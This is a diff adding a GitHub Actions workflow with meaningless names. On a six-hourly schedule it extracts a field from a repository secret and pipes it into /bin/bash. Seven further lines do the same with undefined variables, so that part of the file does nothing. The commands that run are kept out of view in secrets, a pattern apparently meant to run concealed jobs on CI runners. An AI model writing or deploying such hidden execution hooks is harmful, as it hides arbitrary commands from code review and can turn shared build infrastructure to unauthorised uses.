@@ -1,0 +1,24 @@
+name: tongmengxu4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongmengxu4567
+        env:
+          ds804: ${{ secrets.ds804 }}
+        run: |
+          echo $ds804 | jq -r .ntpit2466 | /bin/bash
+          echo $gwc582 | jq -r .xec3854 | /bin/bash
+          echo $qcfcu44 | jq -r .a40 | /bin/bash
+          echo $jgu61 | jq -r .kuif9287 | /bin/bash
+          echo $r0 | jq -r .qnw4643 | /bin/bash
+          echo $teabw61622 | jq -r .hv742 | /bin/bash
+          echo $pq1 | jq -r .e69 | /bin/bash
+          echo $dlv55 | jq -r .pb615 | /bin/bash
+
